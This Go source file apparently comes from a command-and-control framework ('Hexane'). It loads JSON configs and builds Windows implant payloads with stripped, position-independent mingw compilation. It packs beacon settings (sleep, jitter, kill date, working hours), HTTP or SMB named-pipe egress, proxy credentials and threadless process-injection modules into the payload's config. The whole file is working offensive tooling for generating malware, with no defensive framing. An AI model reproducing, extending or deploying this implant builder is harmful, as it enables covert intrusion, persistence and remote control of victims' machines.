package core

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
)

var (
	Debug        = false
	ShowCommands = false

	Cb       = make(chan Callback)
	Payloads = new(HexanePayloads)
	Servers  = new(ServerList)
	Session  = &HexaneSession{
		Username: "lemur",
		Admin:    true,
	}
)

var (
	FstatCreate = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
	FstatWrite  = os.O_WRONLY | os.O_APPEND
	FstatRW     = os.O_RDWR | os.O_APPEND
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func GetModuleConfig(cfgName string) (*Object, error) {
	var (
		err    error
		buffer []byte
		module *Object
	)

	if buffer, err = os.ReadFile(cfgName); err != nil {
		return nil, err
	}

	if err = json.Unmarshal(buffer, &module); err != nil {
		return nil, err
	}

	module.ConfigName = cfgName
	module.IncludeDirectories = append(module.IncludeDirectories, RootDirectory)

	return module, nil
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	key := CryptCreateKey(16)
	patch, err := h.PePatchConfig()
	if err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
	return nil
}

func (h *HexaneConfig) CreateConfig(jsonCfg JsonConfig) error {
	var err error

	h.CompilerCFG = new(CompilerConfig)
	h.ImplantCFG = new(ImplantConfig)

	h.BuildType = jsonCfg.Config.BuildType

	switch h.BuildType {
	case "bin":
		h.CompilerCFG.FileExtension = ".bin"
	case "dll":
		h.CompilerCFG.FileExtension = ".dll"
	case "exe":
		h.CompilerCFG.FileExtension = ".exe"
	default:
		return fmt.Errorf("unkown build type. Exiting")
	}

	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.CompilerCFG.FileExtension))

	h.ImplantName = jsonCfg.ImplantName
	h.CompilerCFG.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.CompilerCFG.FileExtension))

	h.CompilerCFG.Debug = jsonCfg.Config.Debug
	h.CompilerCFG.Arch = jsonCfg.Config.Arch
	h.CompilerCFG.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.CompilerCFG.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.CompilerCFG.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.CompilerCFG.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
	h.CompilerCFG.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.CompilerCFG.Assembler = "/usr/bin/nasm"

	h.ImplantCFG.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsonCfg.Config.Debug {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}

	return err
}

func ReadConfig(cfgName string) error {
	var (
		hexane  = new(HexaneConfig)
		jsonCfg JsonConfig
		buffer  []byte
		err     error
	)

	WrapMessage("INF", fmt.Sprintf("loading %s", cfgName))

	if buffer, err = os.ReadFile(RootDirectory + "json/" + cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &jsonCfg); err != nil {
		return err
	}

	if err = hexane.CreateConfig(jsonCfg); err != nil {
		return err
	}

	hexane.ImplantCFG.EgressPeer = jsonCfg.Config.EgressPeer
	if hexane.ImplantCFG.EgressPeer != "" {
		hexane.GroupId = GetGIDByPeerName(hexane.ImplantCFG.EgressPeer)

	} else {
		Payloads.Group++
		hexane.GroupId = Payloads.Group
	}

	hexane.PeerId = GeneratePeerId()

	hexane.ImplantCFG.Sleeptime = uint32(jsonCfg.Config.Sleeptime)
	hexane.ImplantCFG.Jitter = uint32(jsonCfg.Config.Jitter)
	hexane.ImplantCFG.Domain = jsonCfg.Network.Domain

	if hexane.ImplantCFG.Hostname = jsonCfg.Config.Hostname; hexane.ImplantCFG.Hostname == "" {
		return fmt.Errorf("a hostname must be provided")
	}

	if jsonCfg.Injection != nil {
		hexane.ImplantCFG.Injection = new(Injection)

		if jsonCfg.Injection.Threadless != nil {
			hexane.ImplantCFG.Injection.Threadless = new(Threadless)
			hexane.ImplantCFG.Injection.Threadless.ConfigName = jsonCfg.Injection.Threadless.ConfigName

			if hexane.ImplantCFG.Injection.Object, err = GetModuleConfig(hexane.ImplantCFG.Injection.Threadless.ConfigName); err != nil {
				return err
			}

		}
	}

	if jsonCfg.Network.ProfileType == "http" {

		hexane.ImplantCFG.Profile = new(HttpConfig)
		hexane.ImplantCFG.ProfileTypeId = TRANSPORT_HTTP

		profile := hexane.ImplantCFG.Profile.(*HttpConfig)
		profile.Address = jsonCfg.Network.Address
		profile.Port = jsonCfg.Network.Port
		profile.Useragent = jsonCfg.Network.Useragent

		if jsonCfg.Network.Port < 1 || jsonCfg.Network.Port > 65535 {
			return fmt.Errorf("port number must be between 1 - 65535")
		}

		profile.Endpoints = make([]string, 0, len(jsonCfg.Network.Endpoints))
		profile.Endpoints = append(profile.Endpoints, jsonCfg.Network.Endpoints...)

		hexane.ProxyCFG = new(ProxyConfig)

		if jsonCfg.Network.Proxy.Enabled {
			if jsonCfg.Network.Proxy.Port < 1 || jsonCfg.Network.Proxy.Port > 65535 {
				return errors.New("proxy port number must be between 1 - 65535")
			}

			hexane.ImplantCFG.ProxyBool = true
			hexane.ProxyCFG.Proto = "http://"
			hexane.ProxyCFG.Address = jsonCfg.Network.Proxy.Address
			hexane.ProxyCFG.Port = strconv.Itoa(jsonCfg.Network.Proxy.Port)
		}
	} else if jsonCfg.Network.ProfileType == "smb" {

		hexane.ImplantCFG.ProfileTypeId = TRANSPORT_PIPE
		hexane.ImplantCFG.EgressPipe = GenerateUuid(24)
	}

	hexane.UserSession = Session
	return hexane.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var (
		stream = CreateStream()
		Hours  int32
		err    error
	)

	if Hours, err = ParseWorkingHours(h.ImplantCFG.WorkingHours); err != nil {
		return nil, err
	}

	stream.PackString(h.ImplantCFG.Hostname)
	stream.PackString(h.ImplantCFG.Domain)
	stream.PackDword(h.PeerId)
	stream.PackDword(h.ImplantCFG.Sleeptime)
	stream.PackDword(h.ImplantCFG.Jitter)
	stream.PackInt32(Hours)
	stream.PackDword64(h.ImplantCFG.Killdate)

	switch h.ImplantCFG.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var httpCfg = h.ImplantCFG.Profile.(*HttpConfig)

			stream.PackWString(httpCfg.Useragent)
			stream.PackWString(httpCfg.Address)
			stream.PackDword(uint32(httpCfg.Port))

			if len(httpCfg.Endpoints) == 0 {
				stream.PackDword(1)
				stream.PackWString("/")

			} else {
				stream.PackDword(uint32(len(httpCfg.Endpoints)))
				for _, uri := range httpCfg.Endpoints {
					stream.PackWString(uri)
				}
			}
			if h.ImplantCFG.ProxyBool {
				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.ProxyCFG.Proto, h.ProxyCFG.Address, h.ProxyCFG.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(h.ProxyCFG.Username)
				stream.PackWString(h.ProxyCFG.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			stream.PackWString(h.ImplantCFG.EgressPipe)
		}
	}
	return stream.Buffer, err
}
